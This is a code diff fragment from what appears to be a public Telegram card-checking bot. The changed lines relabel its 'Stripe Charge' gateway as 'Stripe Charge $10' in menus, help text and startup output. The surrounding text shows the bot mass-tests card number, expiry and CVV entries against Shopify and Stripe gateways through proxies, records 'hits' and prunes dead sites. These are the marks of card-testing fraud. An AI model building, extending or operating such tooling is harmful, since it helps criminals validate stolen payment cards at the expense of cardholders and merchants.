             response += f"   🛒 Shopify: *{len(get_all_cards())}*\n"
             response += f"   🔓 Stripe Auth: *{len(get_all_stripe_cards())}*\n"
-            response += f"   💳 Stripe Charge: *{len(get_all_sc_cards())}*"
+            response += f"   💳 Stripe Charge $10: *{len(get_all_sc_cards())}*"
             
             markup = InlineKeyboardMarkup(row_width=1)
             if gw_choice == "shopify" or gw_choice == "all":
@@ -4010,7 +4196,7 @@ Please wait while workers finish...""",
   /clearau ─ Delete cards
   /auhits ─ View hits
 
-💳 *━━ STRIPE CHARGE ━━*
+💳 *━━ STRIPE CHARGE $10 ━━*
   /sc `cc|mm|yy|cvv` ─ Single check
   /msc ─ Mass check (pipeline)
   /clearsc ─ Delete cards
@@ -4029,7 +4215,7 @@ Please wait while workers finish...""",
 
 📂 *━━ FILE UPLOAD ━━*
   Send `.txt` file → select gateway
-  Choose: Shopify, Stripe Auth, Stripe Charge, or ALL
+  Choose: Shopify, Stripe Auth, Stripe Charge $10, or ALL
 
 🧹 *━━ AUTO-MAINTENANCE ━━*
   Dead sites auto-cleaned every 50 checks
@@ -4072,14 +4258,14 @@ def start_health_server():
 # ============================================
 if __name__ == "__main__":
     print("\n" + "═" * 60)
-    print(f"  🤖 {BOT_NAME} {BOT_VERSION} + STRIPE AUTH + STRIPE CHARGE")
+    print(f"  🤖 {BOT_NAME} {BOT_VERSION} + STRIPE AUTH + STRIPE CHARGE $10")
     print(f"  🚀 PARALLEL PIPELINE MODE")
     print("═" * 60)
     print(f"  🌐 Public mode: ALL USERS")
     print(f"  📂 Data dir: {DATA_DIR}")
     print(f"  🛒 Shopify cards: {len(get_all_cards())}")
     print(f"  🔓 Stripe Auth cards: {len(get_all_stripe_cards())}")
-    print(f"  💳 Stripe Charge cards: {len(get_all_sc_cards())}")
+    print(f"  💳 Stripe Charge $10 cards: {len(get_all_sc_cards())}")
     print(f"  🌐 Sites: {len(load_sites())}")
     print(f"  📡 Proxies: {len(load_proxies())}")
     print(f"  🎮 Mode: {current_mode} ({PARALLEL_WORKERS}x)")
@@ -4087,7 +4273,7 @@ if __name__ == "__main__":
     print("  COMMANDS:")
     print("    /mass  ─ Shopify mass check")
     print("    /mau   ─ Stripe Auth mass check (FREE)")
-    print("    /msc   ─ Stripe Charge mass check")
+    print("    /msc   ─ Stripe Charge $10 mass check")
     print("    /px    ─ Check proxies")
     print("    /stats ─ Statistics")
     print("─" * 60)
